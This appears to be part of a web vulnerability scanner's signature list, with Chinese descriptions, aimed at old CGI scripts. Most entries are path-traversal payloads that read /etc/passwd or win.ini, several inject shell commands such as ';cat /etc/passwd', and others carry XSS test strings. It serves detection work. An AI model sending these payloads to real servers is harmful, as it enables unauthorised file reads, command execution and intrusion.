+580#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRS14all-1.1.cgi?cfg=../../../../../../../../etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#Multi Router Traffic Grapher (mrtg.org)易于受到'show files'攻击。应该升级到最新版本。#d9Fa0j#
+581#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSanacondaclip.pl?template=../../../../../../../../../../etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#允许攻击者从服务器读取任意文件。#d9Fa0j#
+582#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSauktion.cgi?menue=../../../../../../../../../../etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#此CGI允许攻击者远程读取服务器任意文件。#d9Fa0j#
+583#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSbigconf.cgi?command=view_textfile&file=/etc/passwd&filters=#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#此CGI允许攻击者远程读取服务器任意文件。#d9Fa0j#
+584#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSbb-hostsvc.sh?HOSTSVC=../../../../../../../../../../etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#BigBrother 1.4h及之前版本允许攻击者读取系统任意文件。#d9Fa0j#
+585#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSbb-hist?HISTFILE=../../../../../../../../../../etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#BigBrother版本1.09b or1.09c允许攻击者读取系统任意文件。#d9Fa0j#
+586#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSbb-hist.sh?HISTFILE=../../../../../../../../../../etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#BigBrother版本1.09b or1.09c允许攻击者读取系统任意文件。#d9Fa0j#
+587#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScommon.php?f=0&ForumLang=../../../../../../../../../../etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#此CGI允许攻击者读取服务器文件。#d9Fa0j#
+589#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScgiforum.pl?thesection=../../../../../../../../../../etc/passwd%00#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#此CGI允许攻击者远程读取服务器任意文件。#d9Fa0j#
+590#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScal_make.pl?p0=../../../../../../../../../../etc/passwd%00#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#此CGI允许攻击者远程读取服务器任意文件。#d9Fa0j#
+591#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSdb4web_c/dbdirname//etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#通过执行db4web获取到passwd文件。#d9Fa0j#
+592#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSdirectorypro.cgi?want=showcat&show=../../../../../../../../../../etc/passwd%00#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#此CGI允许攻击者远程读取服务器任意文件。#d9Fa0j#
+593#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSemumail/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#EmuMail允许远程获取服务器任意文件。#d9Fa0j#
+594#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSemumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#EmuMail允许远程获取服务器任意文件。#d9Fa0j#
+595#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSemu/html/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#EmuMail允许远程获取服务器任意文件。#d9Fa0j#
+596#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSfaxsurvey?cat%20/etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#此CGI允许攻击者执行命令和远程读取文件。#d9Fa0j#
+597#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSfaqmanager.cgi?toc=/etc/passwd%00#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#FAQmanager允许攻击者远程读取服务器任意文件。升级到最新版本：http://www.fourteenminutes.com/code/faqmanager/#d9Fa0j#
+598#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSezshopper/search.cgi?user_id=id&database=dbase1.exm&template=../../../../../../../etc/passwd&distinct=1#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#EZShopper搜索CGI读取任意文件#d9Fa0j#
+599#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSformmail?recipient=root@localhost%0Acat%20/etc/passwd&email=joeuser@localhost&subject=test#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#此CGI允许攻击者从服务器获取任意文件。#d9Fa0j#
+600#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSformmail.pl?recipient=root@localhost%0Acat%20/etc/passwd&email=joeuser@localhost&subject=test#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#此CGI允许攻击者从服务器获取任意文件。#d9Fa0j#
+601#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSgenerate.cgi?content=../../../../../../../../../../winnt/win.ini%00board=board_1#d9Fa0j#GET#d9Fa0j#[fonts]#d9Fa0j#SIX webboard的CGI允许攻击者读取服务器任意文件。#d9Fa0j#
+602#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSgenerate.cgi?content=../../../../../../../../../../windows/win.ini%00board=board_1#d9Fa0j#GET#d9Fa0j#[windows]#d9Fa0j#SIX webboard的CGI允许攻击者读取服务器任意文件。#d9Fa0j#
+603#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSgenerate.cgi?content=../../../../../../../../../../etc/passwd%00board=board_1#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#SIX webboard的CGI允许攻击者读取服务器任意文件。#d9Fa0j#
+604#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRShtmlscript?../../../../../../../../../../etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#此CGI含有一个已知的漏洞允许攻击者读取任何系统文件。#d9Fa0j#
+606#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRShsx.cgi?show=../../../../../../../../../../../etc/passwd%00#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#此CGI含有一个已知的漏洞允许攻击者读取任何系统文件。#d9Fa0j#
+607#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSsewse?/home/httpd/html/sewse/jabber/comment2.jse+/etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#默认脚本允许服务器任意访问。#d9Fa0j#
+608#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSsbcgi/sitebuilder.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过一个有效的用户名密码，SITEBUILDER v1.4可能任意文件获取。请求：/<CGIDIR>/sbcgi/sitebuilder.cgi?username=<user>SITEBUILDER v1.4 may allow retrieval of any file. With a valid username and password#d9Fa0j#
+609#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSmrtg.cgi?cfg=../../../../../../../../etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#Multi Router Traffic Grapher (mrtg.org)易于受到'show files'攻击。应该升级到最新版本。#d9Fa0j#
+610#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSmrtg.cfg?cfg=../../../../../../../../etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#Multi Router Traffic Grapher (mrtg.org)易于受到'show files'攻击。应该升级到最新版本。#d9Fa0j#
+611#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSmain.cgi?board=FREE_BOARD&command=down_load&filename=../../../../../../../../../../etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#此CGI允许攻击者远程读取服务器任意文件。#d9Fa0j#
+612#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSmail/nph-mr.cgi?do=loginhelp&configLanguage=../../../../../../../etc/passwd%00#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#MailReader.com v2.3.31 web package允许远程用户读取任意系统文件。#d9Fa0j#
+613#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSmail/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#EmuMail允许远程获取服务器任意文件。#d9Fa0j#
+614#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSloadpage.cgi?user_id=1&file=..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini#d9Fa0j#GET#d9Fa0j#[windows]#d9Fa0j#此CGI允许攻击者远程读取服务器任意文件。#d9Fa0j#
+615#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSloadpage.cgi?user_id=1&file=../../../../../../../../../../etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#此CGI允许攻击者远程读取服务器任意文件。#d9Fa0j#
+616#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRShtsearch?exclude=%60/etc/passwd%60#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#此CGI含有一个已知的漏洞允许攻击者读取任何系统文件。#d9Fa0j#
+617#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSshop.cgi?page=../../../../../../../etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#远程文件获取。#d9Fa0j#
+618#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSsendtemp.pl?templ=../../../../../../../../../../etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#此CGI含有一个已知的漏洞允许攻击者读取任何系统文件。#d9Fa0j#
+619#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSsearch/search.cgi?keys=*&prc=any&catigory=../../../../../../../../../../../../etc#d9Fa0j#GET#d9Fa0j#resolv.conf#d9Fa0j#此CGI含有一个已知的漏洞允许攻击者读取任何系统文件。#d9Fa0j#
+620#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSsearch.pl?form=../../../../../../../../../../etc/passwd%00#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#ROADS search.pl允许攻击者获取系统文件。#d9Fa0j#
+621#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSsearch.cgi?..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini#d9Fa0j#GET#d9Fa0j#[fonts]#d9Fa0j#此CGI含有一个已知的漏洞允许攻击者读取任何系统文件。#d9Fa0j#
+622#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSsearch.cgi?..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini#d9Fa0j#GET#d9Fa0j#[windows]#d9Fa0j#此CGI含有一个已知的漏洞允许攻击者读取任何系统文件。#d9Fa0j#
+623#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSquickstore.cgi?page=../../../../../../../../../../etc/passwd%00html&cart_id=#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#此CGI允许攻击者远程读取服务器任意文件。#d9Fa0j#
+624#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSpublisher/search.cgi?dir=jobs&template=;cat%20/etc/passwd|&output_number=10#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#AHG的search.cgi允许执行任意命令。www.ahg.com。#d9Fa0j#
+625#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSphp.cgi?/etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#允许攻击者远程读取服务器任意文件并可能执行命令。#d9Fa0j#
+626#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSpals-cgi?palsAction=restart&documentName=/etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#此CGI允许远程用户读取系统文件。#d9Fa0j#
+627#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSopendir.php?/etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#此CGI允许攻击者读取web服务器上任意文件。#d9Fa0j#
+628#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSnph-emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#EmuMail允许远程读取服务器任意文件。#d9Fa0j#
+629#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSnewsdesk.cgi?t=../../../../../../../../../../etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#此CGI允许攻击者远程查看服务器任意文件。#d9Fa0j#
+630#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSnetauth.cgi?cmd=show&page=../../../../../../../../../../etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#此CGI允许攻击者远程查看服务器任意文件。#d9Fa0j#
+631#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSmultihtml.pl?multi=/etc/passwd%00html#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#此CGI允许攻击者远程读取服务器任意文件。也可能通过http://www.packetstormsecurity.org/0009-exploits/multihtml.c获得一个shell#d9Fa0j#
+632#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwebdist.cgi?distloc=;cat%20/etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#此CGI允许攻击者远程读取服务器文件。#d9Fa0j#
+633#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSway-board/way-board.cgi?db=/etc/passwd%00#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#允许攻击者读取服务器任意文件。#d9Fa0j#
+634#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSway-board.cgi?db=/etc/passwd%00#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#允许攻击者读取服务器任意文件。#d9Fa0j#
+635#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSview_item?HTML_FILE=../../../../../../../../../../etc/passwd%00#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#此CGI允许读取远程文件。#d9Fa0j#
+636#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSviewsource?/etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#Allows attacker to retrieve arbitrary files.  Remove from CGI directory.#d9Fa0j#
+637#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSttawebtop.cgi/?action=start&pg=../../../../../../../../../../etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#Tarantell TTAWeb Top CGI允许远程用户读取任意文件。#d9Fa0j#
+638#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRStraffic.cgi?cfg=../../../../../../../../etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#Multi Router Traffic Grapher (mrtg.org)易于受到'show files'攻击。应该升级到最新版本。#d9Fa0j#
+639#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRStechnote/main.cgi?board=FREE_BOARD&command=down_load&filename=/../../../../../../../../../../etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#此CGI允许攻击者远程读取服务器任意文件。#d9Fa0j#
+640#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRStalkback.cgi?article=../../../../../../../../etc/passwd%00&action=view&matchview=1#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#Talkback CGI显示任意文件#d9Fa0j#
+641#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSstory/story.pl?next=../../../../../../../../../../etc/passwd%00#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#story.pl 1.4之前版本允许远程读取任意文件。#d9Fa0j#
+642#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSstory.pl?next=../../../../../../../../../../etc/passwd%00#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#story.pl 1.4之前版本允许远程读取任意文件。#d9Fa0j#
+645#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSssi//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#通过发送编码的'../'指令，服务器允许读取任意系统文件。#d9Fa0j#
+646#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSsojourn.cgi?cat=../../../../../../../../../../etc/password%00#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#此CGI允许攻击者远程读取服务器任意文件。#d9Fa0j#
+647#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSsimple/view_page?mv_arg=|cat%20/etc/passwd|#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#此CGI允许攻击者在服务器上作为HTTP deamon owner执行命令。#d9Fa0j#
+648#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSshopper.cgi?newpage=../../../../../../../../../../etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#Byte's Interactive Web Shopper 版本1和2允许攻击者远程读取文件。注释掉#$debug=1变量。#d9Fa0j#
+652#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSsawmill5?rfcf+%22/etc/passwd%22+spbn+1,1,21,1,1,1,1#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#远程文件获取。#d9Fa0j#
+656#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSzml.cgi?file=../../../../../../../../../../etc/passwd%00#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#Ztreet Markup Language解析允许任意文件远程读取。#d9Fa0j#
+657#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSYaBB.pl?board=news&action=display&num=../../../../../../../../../../etc/passwd%00#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#此CGI允许用户用http daemon的权限读取任意文件。升级到最新版。#d9Fa0j#
+658#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwhois_raw.cgi?fqdn=%0Acat%20/etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#允许攻击者参看任何文件（也可能命令执行）。升级到最新版。#d9Fa0j#
+659#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwhois/whois.cgi?lookup=;&ext=/bin/cat%20/etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#whois.cgi允许系统执行任意命令。#d9Fa0j#
+660#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwhois.cgi?lookup=;&ext=/bin/cat%20/etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#whois.cgi允许系统执行任意命令。#d9Fa0j#
+661#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwebspirs.cgi?sp.nextform=../../../../../../../../../../etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#此CGI允许攻击者远程读取服务器任意文件。#d9Fa0j#
+662#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwebplus?script=../../../../../../../../../../etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#此CGI允许攻击者远程获取任意文件。#d9Fa0j#
+663#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwebmail/html/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#EmuMail允许攻击者远程读取服务器任意文件。#d9Fa0j#
+689#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSalibaba.pl|dir%20..\\..\\..\\..\\..\\..\\..\\,#d9Fa0j#GET#d9Fa0j#boot.ini#d9Fa0j#此CGI允许攻击者在服务器上运行任意命令。#d9Fa0j#
+736#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSredir.exe?URL=http%3A%2F%2Fwww%2Egoogle%2Ecom%2F%0D%0A%0D%0A%3CSCRIPT%3Ealert%28%27Vulnerable%27%29%3C%2FSCRIPT%3E#d9Fa0j#GET#d9Fa0j#<script>alert('Vulnerable')</script>#d9Fa0j#OmniHTTPD（适用在Microsoft Windows操作系统上的WEB服务器程序）系统的redir.exe易受到XSS的攻击。CA-2000-02。#d9Fa0j#
+743#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSurlcount.cgi?%3CIMG%20SRC%3D%22%22%20ONERROR%3D%22alert%28%27Vulnerable%27%29%22%3E#d9Fa0j#GET#d9Fa0j#<script>alert('Vulnerable')</script>#d9Fa0j#Lil'HTTP server服务器上的urlcount.cgi可能受到XSS的攻击。CA-2000-02。#d9Fa0j#
+745#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSstart.cgi/%3Cscript%3Ealert('Vulnerable');%3C/script%3E#d9Fa0j#GET#d9Fa0j#<script>alert('Vulnerable')</script>#d9Fa0j#Aestiva HTML/OS易受到XSS的攻击。CA-2000-02。#d9Fa0j#
+748#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSpbcgi.cgi?name=Joe%Camel&email=%3CSCRIPT%3Ealert%28%27Vulnerable%27%29%3B%3C%2FSCRIPT%3E#d9Fa0j#GET#d9Fa0j#<script>alert('Vulnerable')</script>#d9Fa0j#Lil'HTTP Server 服务器 CGI易受到XSS的攻击。CA-2000-02。#d9Fa0j#
+749#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSmyguestbook.cgi?action=view#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#myGuestBook 1.0 may be vulnerable to Cross Site Scripting (XSS) in posted contents. Upgrade to the latest version from http://www.levcgi.com/.  CA-2000-02.#d9Fa0j#
+750#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSlogin.pl?course_id=\>&lt;SCRIPT&gt;alert('Vulnerable')&lt;/SCRIPT&gt;"#d9Fa0j#GET#d9Fa0j#<script>alert('Vulnerable')</script>#d9Fa0j#BlackBoard.com上的BlackBoard 5易受到XSS的攻击。CA-2000-02。#d9Fa0j#
+751#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRShtsearch.cgi?words=%22%3E%3Cscript%3Ealert%'Vulnerable'%29%3B%3C%2Fscript%3E#d9Fa0j#GET#d9Fa0j#<script>alert('Vulnerable')</script>#d9Fa0j#htdig易受到XSS的攻击。CA-2000-02#d9Fa0j#
+755#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSerba/start/%3Cscript%3Ealert('Vulnerable');%3C/script%3E#d9Fa0j#GET#d9Fa0j#<script>alert('Vulnerable')</script>#d9Fa0j#Aestiva HTML/OS易受到XSS的攻击。CA-2000-02。#d9Fa0j#
+756#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSdiagnose.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#COWS (CGI 在线互联网购物)脚本可能提供给攻击者系统信息，可能受到XSS的攻击。CA-2000-02。#d9Fa0j#
+761#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSathcgi.exe?command=showpage&script='],[0,0]];alert('Vulnerable');a=[['#d9Fa0j#GET#d9Fa0j#<script>alert('Vulnerable')</script>#d9Fa0j#Authoria HR Suite（HR 信息管理应用程序）易受到XSS的攻击。CA-2000-02。#d9Fa0j#
+763#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRS.cobalt/alert/service.cgi?service=<img%20src=javascript:alert('Vulnerable')>#d9Fa0j#GET#d9Fa0j#img src=javascript:alert('Vulnerable')#d9Fa0j#Cobalt RaQ 4 administration CGI易受到XSS的攻击。CA-2000-02。#d9Fa0j#
+786#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/shop/normal_html.cgi?file=&lt;script&gt;alert(\Vulnerable\")&lt;/script&gt;"#d9Fa0j#GET#d9Fa0j#<script>alert(\Vulnerable\")</script>"#d9Fa0j#Happymai电子商务易受到XSS的攻击。CA-2000-02。#d9Fa0j#
+932#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRStitle.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#HNS的titleCGI在2.00或者更早的版本和Lite0.8和更早的版本易受到XSS的攻击。CA-2000-02。#d9Fa0j#
+933#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScompatible.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#This COWS (CGI Online Worldweb Shopping)脚本可能给攻击者提供很多系统信息，可能受到XSS的攻击。CA-2000-02。#d9Fa0j#
+935#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSprobecontrol.cgi?command=enable&username=cancer&password=killer#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#这些信息容易利用扫描器从网站日志中找到。#d9Fa0j#
+936#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSretrieve_password.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#不容易被攻击但是可以从 http://www.dcscripts.com/bugtrac/DCForumID7/3.html找到信息。#d9Fa0j#
+937#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwwwadmin.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#可能是管理员的CGI#d9Fa0j#
+941#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwebmap.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#nmap前后可能被篡改。#d9Fa0j#
+953#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSmt-static/mt-load.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#Movable Type博客的安装CGI被发现。可能可以重新配置或重新载入。#d9Fa0j#
+954#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSmt-static/mt.cfg#d9Fa0j#GET#d9Fa0j#configuration file#d9Fa0j#Movable Type的配置文件被发现。应该不能为远程访问。#d9Fa0j#
+955#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSmt/mt-load.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#Movable Type博客的安装CGI被发现。可能可以重新配置或重新载入。#d9Fa0j#
+956#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSmt/mt.cfg#d9Fa0j#GET#d9Fa0j#configuration file#d9Fa0j#Movable Type的配置文件被发现。应该不能为远程访问。#d9Fa0j#
+960#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScgiwrap/~@USERS#d9Fa0j#GET#d9Fa0j#UID of script userid#d9Fa0j#cgiwrap能被利用来枚举用户的账户。重新编译cgiwrap的‘ 隐藏错误’选项来停止用户枚举。#d9Fa0j#
+961#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScgiwrap/~JUNK(5)#d9Fa0j#GET#d9Fa0j# unable to find the user#d9Fa0j#cgiwrap的错误信息可能被利用找到有效的用户账户。重新编译cgiwrap的‘ 隐藏错误’选项来停止用户枚举。#d9Fa0j#
+962#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScgiwrap/~root#d9Fa0j#GET#d9Fa0j#UID of script userid#d9Fa0j#cgiwrap can be used to enumerate user accounts.  Recompile cgiwrap with the '--with-quiet-errors' option to stop user enumeration.#d9Fa0j#
+963#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSdbman/db.cgi?db=no-db#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#这个CGI允许远程攻击者查看系统信息#d9Fa0j#
+968#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSdumpenv.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#这个CGI给攻击者提供了很多信息。#d9Fa0j#
